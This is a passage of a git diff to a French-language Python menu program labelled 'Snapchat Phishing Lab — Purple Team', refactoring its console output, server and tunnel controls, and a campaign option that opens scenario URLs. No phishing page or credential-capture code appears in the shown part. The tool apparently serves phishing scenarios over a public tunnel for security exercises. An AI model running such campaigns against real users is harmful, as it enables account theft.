+                except Exception as e:
+                    panic(f"Erreur : {e}")
+            pause()
+
         elif c == "6" and server_running:
             watch_live()
         elif c == "7" and server_running:
@@ -849,23 +1307,27 @@ def action_campaign():
             base_url = tunnel_url or f"http://localhost:8080"
             url = f"{base_url}/scenario/{scenario_id}"
             webbrowser.open(url)
-            print(f"\n  {G}✓ Ouverture : {url}{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            okay(f"Ouverture : {url}")
+            pause()
         elif c == "9":
             stop_tunnel()
             stop_server()
             server_running = False
             tunnel_url = None
-            print(f"\n  {Y}Serveur arrêté.{X}")
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            info("Serveur arrêté.")
+            pause()
         elif c == "0":
             return
+
+# ══════════════════════════════════════════════════════════════
+#  MAIN LOOP
+# ══════════════════════════════════════════════════════════════
 
 def main():
     while True:
         show_logo()
-        title_bar()
-        c = show_menu()
+        build_status_bar()
+        c = show_menu_rich() if RICH_OK else show_menu_fallback()
 
         if c == "1":
             action_1_start()
@@ -888,12 +1350,20 @@ def main():
         elif c == "0":
             stop_tunnel()
             stop_server()
-            cls()
-            print()
-            print(LOGO)
-            print()
-            print(f"  {R}Au revoir boss !{X}")
-            print()
+            if RICH_OK:
+                console.clear()
+                console.print(Align.center(Panel(
+                    "[bold red]Au revoir boss ![/]\n\n[dim]Snapchat Phishing Lab — Purple Team[/]",
+                    border_style="red", box=HEAVY
+                )))
+                time.sleep(1.5)
+            else:
+                cls()
+                print()
+                print(f"{Y}{LOGO_RAW}{X}")
+                print()
+                print(f"  {R}Au revoir boss !{X}")
+                print()
             break
 
 if __name__ == "__main__":
